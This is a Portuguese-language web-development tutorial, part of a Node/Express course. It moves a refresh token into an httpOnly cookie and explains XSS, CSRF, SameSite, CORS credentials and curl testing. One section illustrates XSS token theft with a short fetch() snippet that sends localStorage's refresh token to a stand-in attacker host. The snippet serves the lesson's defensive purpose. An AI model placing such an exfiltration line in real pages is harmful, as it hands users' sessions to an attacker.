Projeto Studio Fit — Trilha Node + Express — Parte 11

Cookie httpOnly

O refresh token da parte 8 volta no corpo do login, o que obriga o cliente a guardá-lo em algum lugar que o JavaScript enxerga. Um único script malicioso na página leva a sessão de 7 dias inteira — e depois da parte 10, possivelmente a de um admin. Esta parte tira o refresh token do alcance do script.

1. O problema: onde o cliente guarda o token

A parte 8 terminou com o login respondendo isto:

{
  "access_token": "eyJhbGci...",
  "refresh_token": "9f2c1e4b..."
}

E aí a trilha disse, de propósito, que guardar isso era "problema do cliente, fora do escopo do backend". Hora de encarar: não é. A forma como o servidor entrega o token determina onde o cliente consegue guardá-lo, e isso é decisão de segurança do backend.

Se o token chega no corpo de um JSON, o front-end só tem opções que o próprio JavaScript enxerga:

Onde guardarSobrevive a recarregar a página?Um script da página consegue ler?
localStorageSimSim — localStorage.getItem('refresh_token')
sessionStorageSó na mesma abaSim
Variável em memóriaNão — perde tudo no F5Sim, se o script alcançar o escopo
Cookie comum (sem httpOnly)SimSim — document.cookie
Cookie httpOnlySimNão — invisível pro JavaScript

Só a última linha resolve, e ela não é uma escolha do front-end: é o servidor que decide, mandando o token num header Set-Cookie em vez do corpo da resposta.

2. XSS, em dois minutos

XSS (Cross-Site Scripting) é quando um atacante consegue rodar JavaScript dentro da sua página, no navegador do seu usuário. Alguns caminhos comuns:

  • Um campo de texto que aceita HTML e é exibido sem escapar — o nome do aluno virando <script>...</script> na tela de outra pessoa.
  • Uma dependência de front-end comprometida. Você instalou 800 pacotes transitivos; basta um.
  • Uma extensão de navegador do usuário com permissão de ler a página.

Uma vez rodando, esse script tem os mesmos poderes que o código legítimo da sua aplicação. Se o refresh token está no localStorage, são duas linhas:

fetch('https://servidor-do-atacante.com/roubo', {
  method: 'POST',
  body: localStorage.getItem('refresh_token'),
});

Pense no que esse token vale depois da parte 10: 7 dias de sessão renovável, e o papel vem relido do banco a cada renovação. Se a vítima for um admin, o atacante tem uma semana de acesso administrativo — e a detecção de reuso da parte 8 só dispara se a vítima e o atacante usarem o mesmo token, o que a rotação silenciosa do atacante evita se ele for esperto.

Com o refresh em cookie httpOnly, esse mesmo script continua conseguindo fazer requisições em nome do usuário — não existe bala de prata contra XSS — mas não consegue extrair o token e usá-lo depois, de outra máquina. O estrago fica limitado ao tempo em que a vítima está com a página aberta, em vez de virar uma sessão portátil de 7 dias.

3. httpOnly: o cookie que o script não lê

Cookie é um par nome/valor que o servidor manda no header Set-Cookie, o navegador guarda, e reenvia automaticamente nas próximas requisições pro mesmo destino. O atributo HttpOnly acrescenta uma regra: o JavaScript da página não enxerga esse cookie. Ele não aparece em document.cookie, e não tem API alternativa pra ler.

Token no corpo do JSON

O front recebe a string, decide onde guardar, e precisa lembrar de anexá-la manualmente em cada requisição. Todo esse caminho é visível pro JavaScript — inclusive pro JavaScript do atacante.

Token no cookie httpOnly

O navegador guarda e reenvia sozinho. O front-end nunca vê a string, não precisa gerenciá-la, e um XSS não tem como copiá-la.

Repare no efeito colateral bom: o código do front-end encolhe. Não tem mais "salvar refresh token", "ler refresh token", "limpar no logout" — o navegador faz tudo.

4. Os atributos do cookie, um a um

Um Set-Cookie sem atributos é quase sempre um erro. Os que importam aqui:

AtributoO que fazO que vamos usar
HttpOnlyEsconde o cookie do JavaScript.true — é o motivo desta parte existir.
SecureSó envia o cookie por HTTPS.true em produção, false em desenvolvimento (senão o cookie some no http://localhost).
SameSiteControla se o cookie vai junto em requisições disparadas por outro site. Defesa contra CSRF (seções 6 e 7).'lax'.
PathEm quais caminhos da URL o cookie é enviado.'/auth' — o refresh só interessa pras rotas de autenticação.
Max-AgeQuanto tempo o navegador guarda, em milissegundos no Express.7 dias, o mesmo prazo do token no banco.
DomainCompartilha o cookie com subdomínios.Não usamos — sem o atributo, o cookie fica preso ao host exato que o emitiu, que é o mais restrito.
Por que Path: '/auth' importa

Sem Path, o cookie vai junto em toda requisição pro seu domínio — GET /aulas, POST /alunos, tudo. Mais tráfego à toa e, principalmente, mais superfície: cada rota vira um lugar onde aquele token pode acabar num log de servidor, num proxy, num relatório de erro. Com Path: '/auth', o navegador só anexa o cookie em /auth/* — exatamente as duas rotas que precisam dele.

O detalhe que morde: Path faz parte da identidade do cookie. Apagar um cookie criado com path: '/auth' exige passar o mesmo path no clearCookie — senão o navegador entende que você está apagando outro cookie, e o original continua lá (seção 11).

5. A estratégia: cada token no seu lugar

Decisão importante e que costuma confundir: só o refresh token vai pro cookie. O access token continua voltando no corpo do JSON.

Access tokenRefresh token
Como volta do loginNo corpo da resposta.No header Set-Cookie.
Onde o cliente guardaEm memória (variável da aplicação).Não guarda — o navegador cuida.
Como é enviadoHeader Authorization: Bearer, escrito à mão pelo cliente.Automaticamente pelo navegador, só em /auth/*.
Se vazar15 minutos de estrago.7 dias — por isso é ele que sai do alcance do script.

A lógica: o token de vida longa fica onde o script não alcança; o de vida curta fica onde é prático, porque o dano de perdê-lo é limitado e ele precisa ser anexado manualmente em cada chamada mesmo.

Um efeito colateral bem-vindo: como o access token vive só em memória, recarregar a página perde ele — e o front-end resolve chamando POST /auth/refresh logo no carregamento. O cookie vai sozinho, um access token novo volta, e o usuário nem percebe. Esse "silent refresh" é o padrão em aplicações que usam essa estratégia, e só funciona porque o refresh sobrevive ao F5 dentro do cookie.

6. O que entra junto: CSRF

Cookie tem uma característica que é conveniência e problema ao mesmo tempo: o navegador o envia automaticamente, sem o JavaScript pedir. Inclusive quando quem dispara a requisição é outro site.

CSRF (Cross-Site Request Forgery) é isso: a vítima está logada no seu sistema, visita site-qualquer.com, e uma página de lá dispara uma requisição pra sua API. O navegador anexa o cookie, e o servidor vê uma requisição autenticada que o usuário nunca quis fazer.

1

A vítima tem sessão ativa

Cookie de refresh guardado no navegador, válido por 7 dias.

2

Ela abre um site malicioso

Que contém um formulário ou um fetch apontando pro seu POST /auth/refresh.

3

O navegador anexa o cookie

Porque é assim que cookie funciona — a requisição chega no seu servidor devidamente autenticada.

4

Mas o atacante não lê a resposta

A same-origin policy da parte 9 impede o JavaScript dele de ler o corpo da resposta. Ele consegue causar a requisição, não ver o resultado.

Isso muda bastante o cálculo de risco no nosso caso específico:

O atacante consegue…Impacto aqui
Disparar POST /auth/refresh em nome da vítimaO token roda (parte 8: cada refresh revoga o anterior). O atacante não vê o novo par, mas a vítima é deslogada — incômodo, não roubo.
Disparar POST /auth/logoutDesloga a vítima. Mesmo tipo de dano.
Disparar POST /aulas/:id/matriculasNão — essa rota exige Authorization: Bearer, header que o navegador não anexa sozinho. Nenhuma rota de negócio depende de cookie.
Ler qualquer respostaNão — CORS e same-origin policy barram.

Ou seja: manter o access token em header e só o refresh em cookie limita o CSRF a "conseguem derrubar a sessão da vítima". Chato, não catastrófico. Mesmo assim, dá pra fechar quase de graça com o SameSite — próxima seção.

Por que não vamos implementar token anti-CSRF

A defesa clássica e completa é o double submit cookie ou um token sincronizado: o servidor emite um valor aleatório que o front lê e reenvia num header, e como um site externo não consegue ler o cookie da vítima, ele não consegue forjar o header. É a solução certa quando cookies autenticam ações de negócio. No nosso desenho, as ações de negócio usam Authorization, e o cookie só alcança duas rotas cujo pior caso é deslogar o usuário. SameSite=Lax cobre esse risco com uma linha, e adicionar toda a maquinaria anti-CSRF traria complexidade sem dano equivalente a evitar. Se um dia alguma rota de escrita passar a se autenticar por cookie, essa conta muda — e aí o token anti-CSRF deixa de ser opcional.

7. SameSite não é sobre origem, é sobre site

SameSite instrui o navegador sobre quando não anexar o cookie: se a requisição foi originada por outro site, ele fica em casa. Três valores:

ValorComportamento
StrictNunca envia em requisição vinda de outro site — nem quando o usuário clica num link legítimo. Mais seguro, e quebra fluxos de "voltar pro app a partir de um email".
Lax escolhidoEnvia em navegação de topo com GET (clicar num link), não envia em POST disparado por outro site. Como nossas rotas de cookie são POST, isso já barra o CSRF da seção 6.
NoneEnvia sempre, inclusive cross-site. Exige Secure obrigatoriamente. Necessário quando front e API estão em sites diferentes.

Aqui mora a confusão que faz gente perder horas: "same-site" e "same-origin" são coisas diferentes. Origem (parte 9, CORS) é esquema + host + porta. Site é só o domínio registrável — porta não conta, e subdomínio também não.

Front-endAPISame-origin?Same-site?Cookie vai com Lax?
localhost:5173localhost:3000não (porta difere)simSim
app.studiofit.comapi.studiofit.comnãosim (studiofit.com)Sim
studiofit.comstudiofit-api.netnãonãoNão — precisaria None; Secure

Traduzindo pro nosso caso: em desenvolvimento (portas diferentes no localhost) e em produção com subdomínios do mesmo domínio, Lax funciona. Só um front hospedado em domínio completamente separado exigiria None; Secure — e aí o CSRF volta pra mesa, junto com a necessidade do token anti-CSRF discutido acima.

8. Instalando o cookie-parser

O Express sabe escrever cookies sozinho (res.cookie), mas não sabe ler: sem ajuda, o cookie chega como uma string crua no header Cookie e você teria que fatiar na mão. O cookie-parser transforma isso em req.cookies.

Rodar na raiz do projeto:

npm install cookie-parser

Alterar index.js — no bloco de require do topo, junto do helmet e do corsConfigurado da parte 9:

const helmet = require('helmet');
const cookieParser = require('cookie-parser');
const corsConfigurado = require('./middlewares/cors');

Alterar index.js — na pilha de middlewares, logo depois do express.json. A ordem importa pelo mesmo motivo da parte 9: o parser precisa rodar antes das rotas que vão ler req.cookies:

app.use(helmet());
app.use(corsConfigurado);
app.use(limitadorGlobal);
app.use(express.json({ limit: '10kb' }));
app.use(cookieParser());

9. Um lugar só pras opções do cookie

As opções do cookie vão aparecer em três lugares (login de aluno, login de instrutor, refresh) e precisam bater exatamente — inclusive no clearCookie do logout. Divergir num atributo cria um cookie diferente em vez de sobrescrever o antigo. Então elas nascem centralizadas.

Alterar services/tokenService.js — adicione a constante e a função no fim do arquivo, antes do module.exports, e inclua o novo nome na exportação:

// ...gerarRefreshToken, hashRefreshToken e calcularExpiracao continuam iguais

const COOKIE_REFRESH = 'refresh_token';

function opcoesCookieRefresh() {
  return {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    path: '/auth',
    maxAge: DIAS_DE_VALIDADE * 24 * 60 * 60 * 1000,
  };
}

module.exports = { gerarRefreshToken, hashRefreshToken, calcularExpiracao };
module.exports = {
  gerarRefreshToken,
  hashRefreshToken,
  calcularExpiracao,
  opcoesCookieRefresh,
  COOKIE_REFRESH,
};

DIAS_DE_VALIDADE é a constante que já existe no arquivo desde a parte 8 — reusá-la garante que o prazo do cookie no navegador e o expira_em no banco nunca saiam de sincronia.

secure: process.env.NODE_ENV === 'production' merece atenção: com Secure ligado, o navegador só manda o cookie por HTTPS. Se você deixar true fixo e testar em http://localhost, o cookie é criado e nunca mais volta — e o sintoma é um 400 "refresh_token é obrigatório" que parece bug de código. Deixar false fixo é o erro inverso, e pior: em produção o token trafega em texto puro. A expressão amarra o valor ao ambiente e não depende de ninguém lembrar de trocar.

10. Login: o refresh sai do corpo

Alterar routes/auth.js — no topo, acrescente os dois nomes novos à desestruturação do tokenService que já existe:

const {
  gerarRefreshToken,
  hashRefreshToken,
  calcularExpiracao,
} = require('../services/tokenService');
const {
  gerarRefreshToken,
  hashRefreshToken,
  calcularExpiracao,
  opcoesCookieRefresh,
  COOKIE_REFRESH,
} = require('../services/tokenService');

Agora a mudança central. As três rotas que hoje fazem res.json(tokens) passam a mandar o refresh no cookie e só o access no corpo. Pra não repetir isso três vezes, uma função auxiliar ao lado do emitirTokens:

Adicionar routes/auth.js — logo depois da função emitirTokens e antes do router.post('/login', ...):

function responderComTokens(res, tokens) {
  res.cookie(COOKIE_REFRESH, tokens.refresh_token, opcoesCookieRefresh());
  res.json({ access_token: tokens.access_token });
}

Alterar routes/auth.js — em router.post('/login', ...), a última linha do handler:

  const tokens = await emitirTokens({ id: aluno.id, papel: 'aluno' });

  res.json(tokens);
  responderComTokens(res, tokens);
});

Alterar routes/auth.js — em router.post('/instrutores/login', ...), a última linha do handler, do mesmo jeito:

  const tokens = await emitirTokens({
    id: instrutor.id,
    papel: instrutor.papel,
  });

  res.json(tokens);
  responderComTokens(res, tokens);
});

Resposta antes

{
  "access_token": "eyJ...",
  "refresh_token": "9f2c..."
}

Resposta agora

Set-Cookie: refresh_token=9f2c...;
  Max-Age=604800; Path=/auth;
  HttpOnly; SameSite=Lax

{ "access_token": "eyJ..." }

Segunda quebra de contrato da trilha (a primeira foi na parte 8, quando token virou access_token). Vale a mesma observação: num sistema com clientes em produção, isso exigiria versionamento ou um período mandando o token nos dois lugares. Aqui o único cliente é o seu curl.

11. Refresh e logout: lendo do cookie

Alterar routes/auth.js — em router.post('/refresh', ...), as duas primeiras linhas do handler. O token deixa de vir do body:

router.post('/refresh', async (req, res) => {
  const { refresh_token } = req.body;
  const refresh_token = req.cookies[COOKIE_REFRESH];

  if (!refresh_token) {
    return res.status(400).json({ erro: 'refresh_token é obrigatório' });
    return res.status(401).json({ erro: 'Refresh token ausente' });
  }
Por que o 400 virou 401

Antes, faltar o refresh_token era erro de formato da requisição — o cliente esqueceu um campo obrigatório do corpo, e 400 estava certo. Agora quem manda o token é o navegador, automaticamente; se ele não veio, é porque não existe sessão (cookie expirado, apagado, ou nunca criado). Isso é falta de autenticação, e 401 descreve a situação com honestidade — inclusive pro front-end, que trata 401 mandando o usuário pro login e trataria 400 como bug.

Alterar routes/auth.js — ainda em /refresh, a última linha do handler, pra devolver o par novo do jeito novo (rotação da parte 8 continua igual: o cookie é sobrescrito com o token novo):

  const tokens = await emitirTokens(dono);
  res.json(tokens);
  responderComTokens(res, tokens);
});

Alterar routes/auth.js — router.post('/logout', ...). O handler inteiro muda: lê do cookie, e agora também precisa apagar o cookie do navegador, não só revogar no banco:

router.post('/logout', async (req, res) => {
  const { refresh_token } = req.body;

  if (!refresh_token) {
    return res.status(400).json({ erro: 'refresh_token é obrigatório' });
  }

  const registro = await refreshTokensRepository.buscarPorHash(
    hashRefreshToken(refresh_token),
  );

  if (registro) {
    await refreshTokensRepository.revogar(registro.id);
  }

  res.status(204).send();
  const refresh_token = req.cookies[COOKIE_REFRESH];

  if (refresh_token) {
    const registro = await refreshTokensRepository.buscarPorHash(
      hashRefreshToken(refresh_token),
    );

    if (registro) {
      await refreshTokensRepository.revogar(registro.id);
    }
  }

  res.clearCookie(COOKIE_REFRESH, { path: '/auth' });
  res.status(204).send();
});

Duas coisas mudaram de propósito:

  • Sem cookie não é mais erro. A rota responde 204 de qualquer jeito — o logout continua idempotente (parte 8), e agora "não tinha sessão" é só mais um caminho pro mesmo resultado desejado.
  • O path reaparece no clearCookie. Sem ele, o navegador tenta apagar um cookie refresh_token de Path=/, que não existe — e o de /auth sobrevive intacto. O token estaria revogado no banco (então inútil), mas o cookie morto ficaria no navegador até expirar, e cada /auth/refresh gastaria uma ida ao banco pra descobrir isso.

12. CORS com credenciais

Falta um detalhe sem o qual nada disso funciona num front-end de verdade: por padrão, o navegador não envia cookies em requisições cross-origin feitas por JavaScript, mesmo que o SameSite permita. Duas pontas precisam concordar.

Alterar middlewares/cors.js — dentro do objeto passado pro cors(...), adicione a opção:

const corsConfigurado = cors({
  origin: origensPermitidas,
  methods: ['GET', 'POST', 'PATCH', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,
});

Isso faz o servidor responder Access-Control-Allow-Credentials: true. Do lado do front, a chamada precisa pedir explicitamente:

fetch('http://localhost:3000/auth/refresh', {
  method: 'POST',
  credentials: 'include',
});

Com credentials: true, o navegador passa a rejeitar respostas com Access-Control-Allow-Origin: *. Não é capricho: liberar credenciais pra qualquer origem seria entregar a sessão do usuário pra qualquer site. Como a parte 9 já configurou uma lista explícita de origens em vez de '*', o projeto já está do lado certo — mas se um dia alguém "simplificar" o CORS pra origin: '*', o login para de funcionar no navegador e o erro não vai dizer que a culpa é dessa linha.

13. Testando com curl e cookie jar

Cookie muda a forma de testar: o curl precisa guardar e reenviar, com -c (grava num arquivo) e -b (lê do arquivo).

# login gravando o cookie num arquivo
curl -i -c cookies.txt -X POST http://localhost:3000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"carla@example.com","senha":"senha123"}'
# procure na resposta:
#   Set-Cookie: refresh_token=...; Max-Age=604800; Path=/auth; HttpOnly; SameSite=Lax
# e no corpo: SÓ access_token, sem refresh_token

Confira o que ficou guardado — o arquivo mostra os atributos como o navegador os enxerga:

cat cookies.txt
# linha com: localhost  FALSE  /auth  FALSE    refresh_token  9f2c...
#                              ^path         ^expiração
# refresh SEM mandar nada no corpo — o cookie vai sozinho
curl -i -b cookies.txt -c cookies.txt -X POST http://localhost:3000/auth/refresh
# 200, access_token novo no corpo, e um Set-Cookie novo (rotação da parte 8)

# refresh SEM o cookie
curl -s -w "\n%{http_code}\n" -X POST http://localhost:3000/auth/refresh
# 401, "Refresh token ausente"

O -b cookies.txt -c cookies.txt junto não é redundância: -b envia o cookie atual e -c regrava o arquivo com o cookie novo que veio na resposta. Sem o -c, o arquivo continuaria com o token antigo — que a rotação acabou de revogar — e a próxima chamada dispararia a detecção de reuso da parte 8. Vale como demonstração: rode o refresh duas vezes seguidas só com -b e veja o 401.

# o path funciona? o cookie NÃO deve ir pra rotas fora de /auth
curl -s -b cookies.txt -o /dev/null -w "%{http_code}\n" http://localhost:3000/aulas
# 200 (rota pública) — e o servidor não recebeu cookie nenhum

# logout: revoga no banco E apaga o cookie
curl -i -b cookies.txt -c cookies.txt -X POST http://localhost:3000/auth/logout
# 204, com Set-Cookie: refresh_token=; Expires=Thu, 01 Jan 1970...
# (é assim que se apaga um cookie: reenviar vazio e com data no passado)

# depois do logout, o refresh não tem mais o que mandar
curl -s -w "\n%{http_code}\n" -b cookies.txt -X POST http://localhost:3000/auth/refresh
# 401

E a regressão que importa — nada do que dependia de Authorization mudou:

# pega um access token novo e usa numa rota protegida
curl -s -c cookies.txt -X POST http://localhost:3000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"carla@example.com","senha":"senha123"}'
# copie o access_token da resposta

curl -s -o /dev/null -w "%{http_code}\n" -X POST http://localhost:3000/aulas/1/matriculas \
  -H "Authorization: Bearer ACCESS_AQUI"
# 201 ou 409 (se já matriculado) — nunca 401

14. Erros comuns

  1. secure: true fixo em desenvolvimento — o cookie é criado e nunca volta em http://localhost. O sintoma é um 401 teimoso no refresh, sem nada de errado no código (seção 9).
  2. clearCookie sem o mesmo path — o navegador apaga um cookie que não existe e mantém o verdadeiro. path, domain e o nome formam a identidade do cookie (seção 4).
  3. Esquecer credentials: true no CORS ou credentials: 'include' no fetch — as duas pontas precisam concordar; faltando uma, o navegador simplesmente não manda o cookie, sem erro explícito.
  4. Combinar credentials: true com origin: '*' — o navegador rejeita a resposta inteira. Precisa de lista explícita de origens (seção 12).
  5. Achar que httpOnly resolve XSS — não resolve. Impede o roubo do token; o script malicioso continua conseguindo agir enquanto a página está aberta. A defesa contra XSS é escapar saída, CSP (parte 9) e cuidado com dependências.
  6. Colocar o access token também em cookie — aí as rotas de negócio passam a se autenticar por cookie, o CSRF vira problema de verdade, e o token anti-CSRF deixa de ser opcional (seção 6).
  7. Confundir same-site com same-origin — porta e subdomínio mudam a origem, não o site. Ver a tabela da seção 7 antes de suspeitar de SameSite.
  8. Testar com curl sem -b/-c — sem cookie jar, cada chamada é um navegador novo e sem sessão. Todo refresh dá 401, e não é bug.
  9. Esquecer app.use(cookieParser()) — req.cookies fica undefined, e a leitura req.cookies[COOKIE_REFRESH] lança TypeError → 500.

15. O que vem a seguir

Com isso a categoria segurança e autorização fecha por completo: identidade (parte 7), sessão renovável e revogável (parte 8), borda (parte 9), papéis e posse (parte 10), e o token de vida longa fora do alcance de script (esta). O que sobra dela são itens que dependem de produção — Secure só vale com HTTPS, e o token anti-CSRF só entra se o desenho mudar.

A próxima categoria da ordem combinada é corretude e robustez, e ela ataca o buraco mais visível que restou na API:

  1. Validação de entrada — a próxima parte. Hoje toda validação é if (!nome || !email): mandar data_nascimento: "banana" ou capacidade_maxima: -5 atravessa o if e morre no Postgres como 500, quando deveria ser 400 com mensagem por campo. Schema com Zod ou Joi num middleware resolve pras rotas todas de uma vez.
  2. Erros de domínio — junto: uma classe de erro própria e um error handler que saiba traduzi-la, pra 409/422 pararem de depender de return res.status(...) espalhado por cada rota.
  3. Transações — as duas condições de corrida anotadas: a Regra 1 da parte 6 (capacidade máxima) e a rotação do refresh da parte 8. Mesmo problema, mesma solução, e agora com cookie no meio vale conferir o comportamento sob requisições simultâneas.

Depois dela: banco e dados (migrations, limpeza de tokens expirados, soft-delete de instrutor) → qualidade (Jest + supertest, CI) → contrato da API (paginação, OpenAPI) → produção (logging, health check, Dockerfile, deploy com HTTPS — onde o secure: true desta parte finalmente entra em ação).

Ao testar, o momento que vale a pena observar é o cat cookies.txt: ver o token com Path=/auth e a marca de HttpOnly deixa concreto o que mudou — a string continua existindo, só não está mais em lugar nenhum que um script alcance. Volta com dúvidas, principalmente se algum 401 aparecer no refresh (quase sempre é secure, cookie jar esquecido, ou path divergente).
